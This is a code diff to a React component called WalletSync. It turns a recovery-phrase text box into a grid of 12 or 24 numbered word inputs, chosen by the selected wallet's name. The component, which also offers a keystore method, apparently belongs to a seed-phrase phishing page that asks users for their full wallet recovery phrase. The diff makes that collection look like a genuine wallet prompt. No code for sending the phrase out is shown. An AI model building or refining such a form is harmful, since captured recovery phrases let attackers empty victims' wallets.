@@ -388,20 +388,52 @@ export default function WalletSync() {
                   </div>
 
                   {activeMethod === CONNECTION_METHODS.PHRASE && (
-                    <div className="space-y-3">
-                      <label className="block text-sm font-medium text-gray-700 dark:text-gray-300">
-                        Recovery Phrase
-                      </label>
-                      <textarea
-                        value={formData.phrase}
-                        onChange={(e) => handleInputChange('phrase', e.target.value)}
-                        placeholder="Enter your 12 or 24-word recovery phrase"
-                        rows="3"
-                        className="w-full rounded-xl border border-gray-300 bg-white px-4 py-3 text-sm placeholder-gray-400 focus:border-blue-500 focus:ring-2 focus:ring-blue-200 dark:border-gray-600 dark:bg-gray-800 dark:text-white dark:focus:border-blue-500"
-                        required
-                      />
-                    </div>
-                  )}
+  <div className="space-y-3">
+    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300">
+      Recovery Phrase
+    </label>
+
+    {/* Determine word count dynamically */}
+    {(() => {
+      const wordCount =
+        selected?.name?.toLowerCase().includes("trust") ? 12 : 24;
+
+      const words = (formData.phrase || "").split(" ");
+      while (words.length < wordCount) words.push("");
+
+      const handleWordChange = (i, val) => {
+        const updated = [...words];
+        updated[i] = val.trim();
+        handleInputChange("phrase", updated.join(" ").trim());
+      };
+
+      return (
+        <div className="grid grid-cols-3 sm:grid-cols-4 gap-2">
+          {Array.from({ length: wordCount }).map((_, i) => (
+            <div key={i} className="flex items-center space-x-1">
+              <span className="text-xs text-gray-500 dark:text-gray-400 w-4">
+                {i + 1}.
+              </span>
+              <input
+                type="text"
+                value={words[i] || ""}
+                onChange={(e) => handleWordChange(i, e.target.value)}
+                className="flex-1 rounded-lg border border-gray-300 bg-white px-2 py-1 text-xs focus:border-blue-500 focus:ring-1 focus:ring-blue-200 dark:border-gray-600 dark:bg-gray-800 dark:text-white"
+              />
+            </div>
+          ))}
+        </div>
+      );
+    })()}
+
+    <p className="text-xs text-gray-500 dark:text-gray-400 mt-1">
+      {selected?.name?.includes("Trust")
+        ? "Enter your 12-word recovery phrase."
+        : "Enter your 24-word recovery phrase."}
+    </p>
+  </div>
+)}
+
 
                   {activeMethod === CONNECTION_METHODS.KEYSTORE && (
                     <div className="space-y-3">
